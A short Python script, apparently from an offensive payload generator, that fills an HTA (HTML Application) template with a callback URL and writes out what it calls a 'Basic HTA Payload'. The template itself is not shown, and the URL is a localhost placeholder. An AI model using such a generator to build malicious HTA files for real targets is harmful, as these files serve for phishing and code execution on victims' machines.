
replaceString = "REPLACEURLHERE"

def open_and_write_hta(hta_file_location, url, output_file):
	f=open(hta_file_location, "r")
	s=f.read()
	f.close()
	s=s.replace(replaceString, url)
	print("Writing Basic HTA Payload to file: ", output_file)
	new=open(output_file, "w")
	new.write(s)
	new.close()

if __name__ == "__main__":
	open_and_write_hta("../templates/HTMLApplication/hta-template.hta", "http://127.0.0.1:80", "./hta-test.hta")
